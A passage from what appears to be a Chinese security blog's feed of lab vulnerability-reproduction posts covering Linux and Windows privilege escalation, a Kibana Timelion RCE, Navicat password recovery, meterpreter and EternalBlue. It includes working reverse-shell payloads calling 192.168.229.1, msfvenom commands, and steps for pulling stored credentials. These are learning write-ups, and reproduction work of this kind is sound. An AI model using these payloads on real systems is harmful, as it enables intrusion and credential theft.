    <content type="html"><![CDATA[<p>本地搭建了一个ubuntu的虚拟机，想着提权玩玩<br><a id="more"></a><br>首先我们查看内核版本<br><img src="/2019/10/21/Linux-PTRACE-TRACEME-本地提权漏洞复现/uname.png" alt></p><p>内核是4.10的，然后打开<a href="https://www.exploit-db.com" title="https://www.exploit-db.com" target="_blank" rel="noopener">exploit-db.com</a></p><p>搜索linux kernel，然后找到了这个漏洞<br><img src="/2019/10/21/Linux-PTRACE-TRACEME-本地提权漏洞复现/kernel.png" alt><br>下载exp文件，然后用gcc编译，添加运行权限，运行看效果<br><img src="/2019/10/21/Linux-PTRACE-TRACEME-本地提权漏洞复现/root.png" alt><br>提权成功了~~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本地搭建了一个ubuntu的虚拟机，想着提权玩玩&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>kibana&lt;6.6.0漏洞复现</title>
    <link href="http://yoursite.com/2019/10/19/kibana-6-6-0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/10/19/kibana-6-6-0漏洞复现/</id>
    <published>2019-10-19T07:45:44.000Z</published>
    <updated>2019-10-19T08:04:30.323Z</updated>
    
    <content type="html"><![CDATA[<p>这个洞好像2月份就出来CVE了，最近才开始有人传exp<br><a id="more"></a></p><ul><li>Ubuntu16.04</li><li>elasticsearch-6.5.3</li><li>kibana-6.5.3-linux-x86_64</li></ul><p>注意：elasticsearch和kibana的版本要对应，运行的时候要以非root权限运行，并且要安装java环境</p><p>首先我们下载这两个软件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.5.3.tar.gz</span><br><span class="line"></span><br><span class="line">wget https://artifacts.elastic.co/downloads/kibana/kibana-6.5.3-linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure></p><p>解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf elasticsearch-6.5.3.tar.gz</span><br><span class="line">tar -zxvf kibana-6.5.3-linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure></p><p>先运行elasticsearch<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd elasticsearch-6.5.3</span><br><span class="line">./bin/elasticsearch</span><br></pre></td></tr></table></figure></p><p>然后我们访问：<a href="http://127.0.0.1:9200" target="_blank" rel="noopener">http://127.0.0.1:9200</a><br><img src="/2019/10/19/kibana-6-6-0漏洞复现/9200.png" alt><br>访问成这样，说明运行成功</p><p>然后我们接着运行kibana<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd kibana-6.5.3-linux-x86_64</span><br><span class="line">./bin/kibana</span><br></pre></td></tr></table></figure></p><p>访问：<a href="http://127.0.0.1:5601" target="_blank" rel="noopener">http://127.0.0.1:5601</a><br><img src="/2019/10/19/kibana-6-6-0漏洞复现/5601.png" alt><br>说明搭建成功</p><p><img src="/2019/10/19/kibana-6-6-0漏洞复现/poc.png" alt><br>点击Timelion，输入我们的payload，这里提供两个<br>bash反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.es().props(label.__proto__.env.AAAA=&apos;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.229.1/7770 0&gt;&amp;1&quot;);process.exit()//&apos;).props(label.__proto__.env.NODE_OPTIONS=&apos;--require /proc/self/environ&apos;)</span><br></pre></td></tr></table></figure></p><p>nc反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.es().props(label.__proto__.env.AAAA=&apos;require(&quot;child_process&quot;).exec(&quot;nc -e /bin/bash 192.168.229.1 7770&quot;);process.exit()//&apos;).props(label.__proto__.env.NODE_OPTIONS=&apos;--require /proc/self/environ&apos;)</span><br></pre></td></tr></table></figure></p><p>这样我们就拿到shell了</p><p><img src="/2019/10/19/kibana-6-6-0漏洞复现/whoami.png" alt></p><h1 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h1><p>原作者分析地址：<br><a href="https://slides.com/securitymb/prototype-pollution-in-kibana/" title="https://slides.com/securitymb/prototype-pollution-in-kibana/" target="_blank" rel="noopener">https://slides.com/securitymb/prototype-pollution-in-kibana/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个洞好像2月份就出来CVE了，最近才开始有人传exp&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>MS14-058提权</title>
    <link href="http://yoursite.com/2019/10/18/MS14-058%E6%8F%90%E6%9D%83/"/>
    <id>http://yoursite.com/2019/10/18/MS14-058提权/</id>
    <published>2019-10-18T05:04:10.000Z</published>
    <updated>2019-10-18T05:35:04.660Z</updated>
    
    <content type="html"><![CDATA[<p>其实是本来想找一个提权windows 2008 R2的，在msf上尝试了很多无果<br><a id="more"></a><br><img src="/2019/10/18/MS14-058提权/msf.png" alt></p><p>secwiki上的<a href="https://github.com/SecWiki/windows-kernel-exploits" title="windows-kernel-exploits" target="_blank" rel="noopener">windows-kernel-exploits</a>找到了可利用的工具</p><p>这里测试了几个版本</p><p>windows server 2003 Standard x32<br><img src="/2019/10/18/MS14-058提权/02.png" alt><br>成功</p><p>windows server 2008 r2 x64<br><img src="/2019/10/18/MS14-058提权/08.png" alt><br>成功</p><p>windows7 Service Pack 1<br><img src="/2019/10/18/MS14-058提权/07.png" alt><br>失败</p><p>然后在msf寻找MS14-058的一个exp进行利用</p><p><img src="/2019/10/18/MS14-058提权/false.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse TCP handler on 172.16.28.125:4444 </span><br><span class="line">[-] Exploit aborted due to failure: no-target: Session host is x64, but the target is specified as x86</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure></p><p>这里报了错误，看来msf也不是万能的</p><p>微软官网对此漏洞的介绍：<br><a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-058?redirectedfrom=MSDN" title="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-058?redirectedfrom=MSDN" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-058?redirectedfrom=MSDN</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实是本来想找一个提权windows 2008 R2的，在msf上尝试了很多无果&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>通过Navicat进行数据库提权</title>
    <link href="http://yoursite.com/2019/10/17/%E9%80%9A%E8%BF%87Navicat%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"/>
    <id>http://yoursite.com/2019/10/17/通过Navicat进行数据库提权/</id>
    <published>2019-10-17T05:08:31.000Z</published>
    <updated>2019-10-17T05:30:47.241Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li>phpstudy2014</li><li>Navicat Premium 10(高版本的12不适用于此方法)</li></ul><a id="more"></a><p>我们在渗透的过程中可能会遇到服务器上面安装了Navicat这样的第三方软件，可以通过Navicat连接，但是不是root权限或者权限太低，这个时候要是Navicat中保存了root的连接，我们就可以通过一些方法搞到root的密码</p><p>网上看了很多文章，都是介绍的两种方法：<br>1、通过logs文件寻找登录的账号密码<br>2、通过注册表和星号查看器来查看连接的密码</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="Logs日志"><a href="#Logs日志" class="headerlink" title="Logs日志"></a>Logs日志</h2><p>Navicat会将日志保存在 <strong>Documents\Navicat\Premium\logs</strong> 中，在这个里面 <strong>LogHistory</strong> 可能找到登录账号密码<br><img src="/2019/10/17/通过Navicat进行数据库提权/history.png" alt></p><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p>Navicat会将用户密码报错到注册表  <strong>HKEY_CURRENT_USER\Software\PremiumSoft\navicat\Servers</strong> 中<br><img src="/2019/10/17/通过Navicat进行数据库提权/regedit.png" alt></p><p>这里我们在服务器上看见了HOST、PWD信息，我们将PWD的数值复制出来<br><img src="/2019/10/17/通过Navicat进行数据库提权/pwd.png" alt></p><p>然后本地搭建一样的环境，新建一个链接<br><img src="/2019/10/17/通过Navicat进行数据库提权/local.png" alt><br>密码随便填写一个，然后在本地的注册表中将PWD的值修改成上面的那个数值，然后重新启动Navicat,利用星号查看器就能看到密码啦~<br><img src="/2019/10/17/通过Navicat进行数据库提权/root.png" alt></p><p>不过这种方法只能在低版本的Navicat中进行，最新版(12)版本的Navicat已经不会保存log文件，利用星号查看器也查看不了密码了</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;phpstudy2014&lt;/li&gt;
&lt;li&gt;Navicat Premium 10(高版本的12不适用于此方法)&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux 本地sudo权限提升漏洞(CVE-2019-14287)</title>
    <link href="http://yoursite.com/2019/10/16/Linux-%E6%9C%AC%E5%9C%B0sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-CVE-2019-14287/"/>
    <id>http://yoursite.com/2019/10/16/Linux-本地sudo权限提升漏洞-CVE-2019-14287/</id>
    <published>2019-10-16T06:53:24.000Z</published>
    <updated>2019-10-16T07:41:36.913Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li>此漏洞可以使受限制的用户运行root命令</li><li>1.8.28之前的sudo版本均会受到影响</li></ul><a id="more"></a><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先我们利用root用户新建一个test账号：<br><img src="/2019/10/16/Linux-本地sudo权限提升漏洞-CVE-2019-14287/test.png" alt></p><p>然后我们编辑/etc/sudoers(这里也要求是root权限)<br><img src="/2019/10/16/Linux-本地sudo权限提升漏洞-CVE-2019-14287/sudoers.png" alt><br>这里添加一行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testAll=(ALL,!root) /bin/bash</span><br></pre></td></tr></table></figure></p><p>然后我们切换到test用户，执行我们的命令：<br><img src="/2019/10/16/Linux-本地sudo权限提升漏洞-CVE-2019-14287/success.png" alt></p><p>这里是以root的权限执行了/bin/bash,这个命令就是打开一个新的shell，我们再来试一试</p><p>修改/etc/sudoers<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testAll=(ALL,!root) /usr/bin/id</span><br></pre></td></tr></table></figure></p><p>这里我们再来看，这里确实是以root的身份运行了id这个命令<br><img src="/2019/10/16/Linux-本地sudo权限提升漏洞-CVE-2019-14287/id.png" alt><br>也可以设置去运行其他的命令</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>我们先来看看/etc/sudoers中我们添加的配置信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">testAll=(ALL,!root) /usr/bin/id</span><br><span class="line">授权用户/组 主机=[(切换到哪些用户或组)][是否需要输入密码验证] 命令1,命令2</span><br></pre></td></tr></table></figure></p><p>我们这里并没有设置是否需要输入密码，所以默认是要输入密码执行的，要是不想要密码可以设置为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testAll=(ALL,!root) NOPASSWD:ALL /usr/bin/id</span><br></pre></td></tr></table></figure></p><p>我们再去运行一下，就不需要密码了<br><img src="/2019/10/16/Linux-本地sudo权限提升漏洞-CVE-2019-14287/nopasswd.png" alt></p><p>-u#-1 可以指定用户的id值，但是我们没有id值为-1的用户，默认应该就将不能识别的id值变成了0，id为0的值就是root了</p><p>(这是因为将用户ID转换为用户名的函数将-1或其无符号等效4294967295误认为是0，该值始终是root用户的用户ID。)</p><p>讲解完毕~</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://thehackernews.com/2019/10/linux-sudo-run-as-root-flaw.html" title="https://thehackernews.com/2019/10/linux-sudo-run-as-root-flaw.html" target="_blank" rel="noopener">https://thehackernews.com/2019/10/linux-sudo-run-as-root-flaw.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;此漏洞可以使受限制的用户运行root命令&lt;/li&gt;
&lt;li&gt;1.8.28之前的sudo版本均会受到影响&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu本地提权漏洞复现(CVE-2017-16995)</title>
    <link href="http://yoursite.com/2019/10/15/Ubuntu%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2017-16995/"/>
    <id>http://yoursite.com/2019/10/15/Ubuntu本地提权漏洞复现-CVE-2017-16995/</id>
    <published>2019-10-15T03:49:01.000Z</published>
    <updated>2019-10-15T04:18:19.445Z</updated>
    
    <content type="html"><![CDATA[<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Ubuntu 16.04(Linux Kernel Version 4.14-4.4)<br>Exp: <a href="http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&amp;isappinstalled=0" target="_blank" rel="noopener">http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&amp;isappinstalled=0</a></p><a id="more"></a><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>首先看下我本地的Ubuntu内核信息<br><img src="/2019/10/15/Ubuntu本地提权漏洞复现-CVE-2017-16995/uname_1.png" alt><br>这里不是在受影响的范围版本之中，我们来升级内核</p><p>这里升级成4.4.0的内核<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-headers-4.4.0-92-generic linux-image-4.4.0-92-generic</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/15/Ubuntu本地提权漏洞复现-CVE-2017-16995/apt-get.png" alt></p><p>然后我们修改内核的配置信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/15/Ubuntu本地提权漏洞复现-CVE-2017-16995/before.png" alt><br><img src="/2019/10/15/Ubuntu本地提权漏洞复现-CVE-2017-16995/before.png" alt></p><p>要将配置文件中的版本号全部修改，然后reboot重启，再次查看内核的版本号<br><img src="/2019/10/15/Ubuntu本地提权漏洞复现-CVE-2017-16995/uname_2.png" alt></p><p>然后我们将我们的exp拷贝过来，用gcc进行编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc upstream44.c -o upstream44</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/15/Ubuntu本地提权漏洞复现-CVE-2017-16995/root.png" alt><br>提权成功！</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h1&gt;&lt;p&gt;Ubuntu 16.04(Linux Kernel Version 4.14-4.4)&lt;br&gt;Exp: &lt;a href=&quot;http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&amp;amp;isappinstalled=0&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&amp;amp;isappinstalled=0&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>后渗透之meterpreter初体验</title>
    <link href="http://yoursite.com/2019/10/14/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8Bmeterpreter%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://yoursite.com/2019/10/14/后渗透之meterpreter初体验/</id>
    <published>2019-10-14T08:32:51.000Z</published>
    <updated>2019-10-14T08:59:24.840Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。</p><a id="more"></a><h1 id="获取一个meterpreter-Linux"><a href="#获取一个meterpreter-Linux" class="headerlink" title="获取一个meterpreter(Linux)"></a>获取一个meterpreter(Linux)</h1><ul><li>Kali:192.168.229.139</li><li>Ubuntu:192.168.229.135</li></ul><p>首先用 <strong>msfvenom</strong> 生成一个反弹shell的木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444  -f elf -o shell</span><br><span class="line"></span><br><span class="line">-p payload</span><br><span class="line">-f 输出的格式</span><br><span class="line">-o 输出的文件名</span><br></pre></td></tr></table></figure></p><p>然后将生成的木马搞到我们的目标机器上(这里就直接搬过去了)，放在了tmp目录下，一般这个目录下都会有可执行的权限，没有我们就(chmod +x shell)<br><img src="/2019/10/14/后渗透之meterpreter初体验/ubuntu.png" alt></p><p>然后我们打开msf控制台，使用我们的模块，并设定Payload和本地的ip:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.229.139</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/14/后渗透之meterpreter初体验/options.png" alt><br>然后我们在目标机器上运行我们的shell文件<br><img src="/2019/10/14/后渗透之meterpreter初体验/success.png" alt><br>这样就反弹成功啦~</p><p><img src="/2019/10/14/后渗透之meterpreter初体验/unavailable.png" alt><br>可能会出现这样的问题，就是我们设定的端口被占用了，要关闭端口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fuser -k -n tcp 4444</span><br></pre></td></tr></table></figure></p><h1 id="Meterpreter基本命令"><a href="#Meterpreter基本命令" class="headerlink" title="Meterpreter基本命令"></a>Meterpreter基本命令</h1><p><a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">https://xz.aliyun.com/t/2536</a></p><p>meterpreter可以进行shell命令、提权、mimikatz抓取密码、屏幕截图、键盘记录等，挺方便的。后续再慢慢玩这些功能</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="后渗透" scheme="http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows pr提权</title>
    <link href="http://yoursite.com/2019/10/12/Windows-pr%E6%8F%90%E6%9D%83/"/>
    <id>http://yoursite.com/2019/10/12/Windows-pr提权/</id>
    <published>2019-10-12T10:43:31.000Z</published>
    <updated>2019-10-12T11:37:11.349Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>Windows Server 2003 r2 Standard</li><li>IIS6.0 + asp<a id="more"></a></li></ul><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>BUGTRAQ  ID: 34443<br>CVE(CAN) ID: CVE-2009-0079</p><p>发布日期：2009-04-14<br>更新日期：2009-04-24</p><p>受影响系统：<br>Microsoft Windows XP x64 SP2<br>Microsoft Windows XP x64<br>Microsoft Windows XP SP3<br>Microsoft Windows XP SP2<br>Microsoft Windows Server 2003 SP2<br>Microsoft Windows Server 2003 SP1</p><p>也就是说只有Windows Server 2003和windows xp系统能够使用 pr 提权。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>当我们拿到shell之后上传一个大马方便进行操作<br><img src="/2019/10/12/Windows-pr提权/大马.png" alt></p><p>首先我们来看看这个时候的权限<br><img src="/2019/10/12/Windows-pr提权/cmd.png" alt><br>这里并不是administrator最高权限，我们上传我们的pr.exe文件上去，就在我们的网站目录下<br><img src="/2019/10/12/Windows-pr提权/prok.png" alt><br>上传之后将我们的prok.exe 重命名成cmd.exe了<br><img src="/2019/10/12/Windows-pr提权/success.png" alt><br>接下来我们运行这个文件<br><img src="/2019/10/12/Windows-pr提权/cmd_2.png" alt></p><p>这里权限已经提升了，添加一个新的用户<br><img src="/2019/10/12/Windows-pr提权/netuser.png" alt><br><img src="/2019/10/12/Windows-pr提权/cmd_3.png" alt><br><img src="/2019/10/12/Windows-pr提权/cmd_4.png" alt><br>已经是管理员权限了，接下来看看开的端口<br><img src="/2019/10/12/Windows-pr提权/3389.png" alt><br>(这里我手动开启了3389 ==)<br>然后远程桌面连接<br><img src="/2019/10/12/Windows-pr提权/mstsc.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;Windows Server 2003 r2 Standard&lt;/li&gt;
&lt;li&gt;IIS6.0 + asp&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>利用DNSLOG进行盲注</title>
    <link href="http://yoursite.com/2019/10/11/%E5%88%A9%E7%94%A8DNSLOG%E8%BF%9B%E8%A1%8C%E7%9B%B2%E6%B3%A8/"/>
    <id>http://yoursite.com/2019/10/11/利用DNSLOG进行盲注/</id>
    <published>2019-10-11T09:03:11.000Z</published>
    <updated>2019-10-11T09:03:11.147Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Joomla 3.4.6 configuration.php 漏洞</title>
    <link href="http://yoursite.com/2019/10/10/Joomla-3-4-6-configuration-php-%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/</id>
    <published>2019-10-10T06:13:34.000Z</published>
    <updated>2019-10-10T11:28:46.325Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>Joolma: <a href="https://downloads.joomla.org/it/cms/joomla3/3-4-6" target="_blank" rel="noopener">https://downloads.joomla.org/it/cms/joomla3/3-4-6</a></li><li>EXP: <a href="https://www.exploit-db.com/exploits/47465" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/47465</a></li><li>Target: <a href="http://127.0.0.1/joolma/" target="_blank" rel="noopener">http://127.0.0.1/joolma/</a></li><li>Phpstudy<a id="more"></a></li></ul><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先使用脚本检测一下是否存在漏洞<br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/vulnerable.png" alt></p><p>然后利用exploit参数进行攻击，因为是本地复现，所以后面监听的端口就随意了<br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/exp.png" alt></p><p>图中的框框就是我们shell的地址和密码了，遂用菜刀链接之<br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/websehll.png" alt></p><p>再来看看我们的configuration.php中的内容怎么样了<br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/conf.png" alt><br>发现在我们的文件最后面添加上了一句话</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p><a href="https://www.cnblogs.com/magic-zero/p/11643916.html" target="_blank" rel="noopener">https://www.cnblogs.com/magic-zero/p/11643916.html</a><br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/reson.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;Joolma: &lt;a href=&quot;https://downloads.joomla.org/it/cms/joomla3/3-4-6&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://downloads.joomla.org/it/cms/joomla3/3-4-6&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;EXP: &lt;a href=&quot;https://www.exploit-db.com/exploits/47465&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.exploit-db.com/exploits/47465&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Target: &lt;a href=&quot;http://127.0.0.1/joolma/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://127.0.0.1/joolma/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Phpstudy&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>MS17_010漏洞复现</title>
    <link href="http://yoursite.com/2019/10/09/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/10/09/MS17-010漏洞复现/</id>
    <published>2019-10-09T08:08:08.000Z</published>
    <updated>2019-10-09T08:58:54.008Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>KALI:192.168.79.130</li><li>WIN7:192.168.79.128</li><li>WIN2008:192.168.79.128</li><li>Msf</li></ul><a id="more"></a><h1 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h1><p>首先打开msf的控制台，我们搜索17010漏洞相关的利用脚本<br><img src="/2019/10/09/MS17-010漏洞复现/console.png" alt></p><p>这里看见有两个种模块<br>auxiliary(探测)<br>exploits(利用)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#利用这个探测模块</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"></span><br><span class="line">#设置目标，扫描这个网段</span><br><span class="line">set RHOST 192.168.79.2/24</span><br><span class="line"></span><br><span class="line">#设置线程</span><br><span class="line">set THREADS 3</span><br><span class="line"></span><br><span class="line">#运行</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2019/10/09/MS17-010漏洞复现/scan.png" alt><br>这里发现了我们的两台windos主机都探测出了漏洞</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>使用exploit模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set RHOST 192.168.79.128</span><br><span 